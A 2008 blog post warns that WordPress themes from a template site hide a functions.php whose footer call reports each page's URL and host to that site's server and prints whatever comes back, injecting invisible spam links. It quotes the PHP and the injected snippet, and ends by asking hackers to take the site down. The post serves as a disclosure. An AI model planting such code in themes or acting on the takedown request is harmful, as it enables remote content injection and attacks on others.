---
comments: true
date: 2008-01-24 04:43:02
layout: post
slug: dont-ever-user-wwwtemplatesbrowsercom-for-wordpress-themes
title: Don't ever user www.templatesbrowser.com for wordpress themes
wordpress_id: 182
categories:
- Misc
- PHP
---

Today I noticed a JavaScript error on my site, on investigation I saw the following JavaScript code in the page source:

``` javascript
var CCounter=2151068; var CCsite=www.chapter31.com; CCinvisible=0;
<nosc/ript><a hreflang="de" lang="de" href="http://www.portalux.com/">online casino</a></nosc/ript>
var CCounter=2151068; var CCsite=www.chapter31.com; CCinvisible=0;
```

My investigations found that where I downloaded the template from was a nice (NOT) little site called [http://www.templatesbrowser.com/](http://www.templatesbrowser.com/wordpress-themes/). Now what they do is add a "functions.php" file in the original code base, then call a method from the footer "credits();" which is in the functions.php file:

``` javascript
<?php

function credits()
{
 $url = "http://get.templatesbrowser.com/wp.php?" .
       "url=" . urlencode($_SERVER['REQUEST_URI']) . "&" . "host=" . urlencode($_SERVER['HTTP_HOST']);
 $check = @fsockopen("get.templatesbrowser.com", 80, $errno, $errstr, 3);
 if($check)
 {
  @readfile($url);
  fclose($check);
 }
}

?>
```

More information was found from [www.onnoot.com/](http://www.onnoot.com/e/532/Templatesbrowser.com_puts_link_spam_in_WordPress):


> This produces a link at the bottom of every WordPress page, that is invisible for human readers.
>
> Templatesbrowser.com apparently does this to increase the pagerank of certain websites. Weâ€™re not sure if Google falls for this little link spam trick. But if Google does find out that your page contains link spam, you risk being punished. That could mean that your website is removed from Google's search result pages.

So for those who don't know I hope this was useful, if any people out there are crackers/hackers do me a favour and pull their site down :)
